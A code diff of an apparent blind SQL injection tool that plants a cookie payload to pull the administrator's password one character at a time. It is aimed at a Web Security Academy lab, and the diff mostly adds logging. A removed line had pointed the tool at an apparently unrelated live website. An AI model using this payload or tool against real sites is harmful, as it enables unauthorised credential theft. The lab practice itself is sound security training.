@@ -1,22 +1,32 @@
 #!/usr/bin/env python3.12
-# cookie_injector_core.py ver 1.1
+# cookie_injector_core.py
+import inspect
 import sys
+import logging
 
 import requests
 from requests.cookies import RequestsCookieJar
 from rich.console import Console
 
 from SQLInjector.custom_errors import CookieInjectorGetResponseError
+from SQLInjector.reverse_logger import ReverseLogger, filename_parser
 
 c = Console()
 
-# url = "https://0a2100a904f75acc80eb8f0800a5009b.web-security-academy.net/product?productId=7"
-url = "https://sivanandamusic.it"
+url = "https://0a2100a904f75acc80eb8f0800a5009b.web-security-academy.net/product?productId=7"
 code = "' anD (SELECT SUBSTRING(password,18,1) FROM users WHERE username = 'administrator') = 'g'--"
 payload_char = "b"
 confirm_bytes = b"Welcome"
 cookiename = "TrackingId"
 password_length = 20
+
+filename, log_filename = filename_parser(log_file_name=__file__)
+rev_log = ReverseLogger(
+    logger_name=filename,
+    log_file_path=log_filename,
+    logging_level=logging.INFO,
+)
+from SQLInjector.reverse_logger import log_error_and_raise_exception, log_error, log_info
 
 
 class CookieInjector:
@@ -43,9 +53,13 @@ class CookieInjector:
         try:
             if self.cookies is not None:
                 self.response = requests.get(self.target_url, cookies=self.cookies)
+                info_message = f"Status code: {self.response.status_code}"
+                log_info(rev_log, info_message, inspect.currentframe().f_lineno)
                 self.cookies = None
             else:
                 self.response = requests.get(self.target_url)
+                info_message = f"Status code: {self.response.status_code}"
+                log_info(rev_log, info_message, inspect.currentframe().f_lineno)
         except (requests.RequestException, requests.exceptions.RequestException) as e:
             error_message = f"Error sending the request: {e}"
             raise CookieInjectorGetResponseError(error_message)
